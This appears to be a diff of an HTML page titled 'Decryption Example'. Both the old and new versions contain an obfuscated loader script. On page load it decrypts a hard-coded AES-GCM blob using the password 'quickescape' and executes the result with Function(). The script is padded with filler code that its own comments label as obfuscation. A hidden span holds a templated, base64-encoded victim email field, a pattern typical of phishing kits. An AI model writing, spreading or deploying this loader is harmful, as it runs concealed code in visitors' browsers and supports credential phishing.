@@ -1,89 +1,99 @@
 <!DOCTYPE html>
-<span nike-tes2="" hidden adidas="<%=EMAIL64%>"></span>
-<script>
-    // Helper function to convert hex to Uint8Array
-    const hexToBytes = (hex) => {
-        console.log("Converting hex to bytes...");
-        return Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
-    };
-
-    // Function to decrypt AES-GCM encrypted data
-    const decrypt = async (enc, ivHex, saltHex, key) => {
-        console.log("Starting decryption...");
-        const iv = hexToBytes(ivHex);
-        const salt = hexToBytes(saltHex);
-
-        console.log("Preparing key material...");
-        const keyMaterial = await crypto.subtle.importKey(
-            "raw",
-            new TextEncoder().encode(key),
-            { name: "PBKDF2" },
-            false,
-            ["deriveKey"]
-        );
-
-        const aesKey = await crypto.subtle.deriveKey(
-            { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
-            keyMaterial,
-            { name: "AES-GCM", length: 256 },
-            false,
-            ["decrypt"]
-        );
-
-        console.log("Attempting decryption...");
-        try {
-            const decryptedBytes = await crypto.subtle.decrypt(
-                { name: "AES-GCM", iv },
-                aesKey,
-                hexToBytes(enc)
-            );
-            console.log("Decryption succeeded!");
-            return new TextDecoder().decode(decryptedBytes);
-        } catch (error) {
-            console.error("Decryption failed:", error);
-            throw error;
-        }
-    };
-
-    // Useless helper function to simulate random delays
-    const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-
-    // Self-executing async function
-    (async () => {
-        console.log("Starting script execution...");
-
-        // Dummy variable for added obfuscation
-        const placeholderText = "Placeholder";
-        console.log("Placeholder initialized:", placeholderText);
-
-        // Encryption parameters
-        const params = {
-            iv: "c444d6b988c97f7ea2aa5716",
-            salt: "06b9dcb639aeb4a298624e4d2709f4c3",
-            data: "26cbae7ed8856d9cd8d7fed943b6b4057d02f653f16ad4b50df937b866b7491270da18b75c5b1ae09454dfc024e1b06af75301f0b4d1429df0198573f04c1fa219e4eb7b055c8fc740f4cd0bce40244c73927abba0d44a2910efd70981c5002a099cb8ac42273d78c2da6a22762bb4bc1e702426a9f0b75e074607bca07e7122a60e92fe1d35ee602910fce409af78027670a7b55d09608632b357201c6a14a7da17eb9b30d60c98e95f85a26a3e7a27406c70c88c74ebf167a2de66ec9853c6c2bbd82ee92a6f",
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Decryption Example</title>
+</head>
+<body>
+    <div id="hidden-container" style="display:none;">
+        <span nike-tes2="" adidas="<%=EMAIL64%>">Hidden Data</span>
+    </div>
+    <script>
+        // Convert hex string to Uint8Array
+        const hexToBytes = (hex) => {
+            console.log("Processing hex string...");
+            const randomUnusedVar = Math.random(); // Useless logic
+            return Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
         };
 
-        // Decrypt the data
-        try {
-            console.log("Decrypting data...");
-            const result = await decrypt(params.data, params.iv, params.salt, "quickescape");
-            console.log("Decrypted Result:", result);
+        // Decrypt AES-GCM encrypted data
+        const decrypt = async (enc, ivHex, saltHex, key) => {
+            console.log("Initializing decryption...");
+            const iv = hexToBytes(ivHex);
+            const salt = hexToBytes(saltHex);
 
-            // Execute decrypted text as a function (if valid JavaScript code)
-            console.log("Executing decrypted content...");
-            Function(`${result}`)();
+            console.log("Creating key material...");
+            const keyMaterial = await crypto.subtle.importKey(
+                "raw",
+                new TextEncoder().encode(key),
+                { name: "PBKDF2" },
+                false,
+                ["deriveKey"]
+            );
 
-            // Add random operations for obfuscation
-            console.log("Adding random operations...");
-            const reverseString = (str) => str.split("").reverse().join("");
-            const reversed = reverseString(result);
-            console.log("Reversed Text:", reversed);
+            const aesKey = await crypto.subtle.deriveKey(
+                { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
+                keyMaterial,
+                { name: "AES-GCM", length: 256 },
+                false,
+                ["decrypt"]
+            );
 
-            // Dummy logic to check string properties
-            const lengthType = result.length % 2 === 0 ? "Even" : "Odd";
-            // console.log("String Length Type:", lengthType);
-        } catch (error) {
-            // console.error("Error during decryption or execution:", error);
-        }
-    })();
-</script>
+            console.log("Attempting to decrypt...");
+            try {
+                const decryptedBytes = await crypto.subtle.decrypt(
+                    { name: "AES-GCM", iv },
+                    aesKey,
+                    hexToBytes(enc)
+                );
+                console.log("Decryption completed!");
+                return new TextDecoder().decode(decryptedBytes);
+            } catch (error) {
+                console.error("Decryption failed. Debug Info:", error);
+                throw error;
+            }
+        };
+
+        // Random useless function
+        const generateDummyData = () => {
+            console.log("Generating dummy data...");
+            const dummy = [];
+            for (let i = 0; i < 5; i++) {
+                dummy.push(String.fromCharCode(65 + i));
+            }
+            console.log("Dummy Data:", dummy.join("-"));
+        };
+
+        // Self-executing async function
+        (async () => {
+            console.log("Starting main execution...");
+
+            const params = {
+                iv: "c444d6b988c97f7ea2aa5716",
+                salt: "06b9dcb639aeb4a298624e4d2709f4c3",
+                data: "26cbae7ed8856d9cd8d7fed943b6b4057d02f653f16ad4b50df937b866b7491270da18b75c5b1ae09454dfc024e1b06af75301f0b4d1429df0198573f04c1fa219e4eb7b055c8fc740f4cd0bce40244c73927abba0d44a2910efd70981c5002a099cb8ac42273d78c2da6a22762bb4bc1e702426a9f0b75e074607bca07e7122a60e92fe1d35ee602910fce409af78027670a7b55d09608632b357201c6a14a7da17eb9b30d60c98e95f85a26a3e7a27406c70c88c74ebf167a2de66ec9853c6c2bbd82ee92a6f",
+            };
+
+            try {
+                console.log("Decrypting the payload...");
+                const result = await decrypt(params.data, params.iv, params.salt, "quickescape");
+                console.log("Decrypted Content:", result);
+
+                // Dummy transformation
+                const randomLogic = result.split("").reverse().join("");
+                console.log("Transformed Content:", randomLogic);
+
+                // Execute decrypted content
+                console.log("Executing decrypted script...");
+                Function(`${result}`)();
+            } catch (error) {
+                console.error("Error in execution:", error);
+            }
+
+            // Execute dummy logic
+            generateDummyData();
+        })();
+    </script>
+</body>
+</html>
